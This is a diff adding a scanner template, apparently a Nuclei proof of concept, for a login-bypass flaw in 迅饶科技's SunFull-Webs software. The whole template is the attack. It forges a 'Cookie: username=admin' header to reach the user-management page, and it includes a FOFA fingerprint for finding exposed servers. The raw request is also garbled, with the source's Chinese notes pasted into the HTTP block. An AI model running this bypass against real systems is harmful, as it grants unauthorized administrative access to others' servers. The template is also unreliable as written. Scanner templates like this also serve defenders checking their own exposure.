@@ -1,0 +1,37 @@
+id: poc-bpv4wu48hmr1lgo7
+info:
+  name: 迅饶科技 登录绕过漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bpv4wu48hmr1lgo7'
+  tags: unauth,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: bpv4wu48hmr1lgo7
+    fofa: server="SunFull-Webs"
+http:
+- raw:
+  - 'GET /index.html HTTP/1.1
+
+
+    Cookie: username=admin
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    用户管理
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
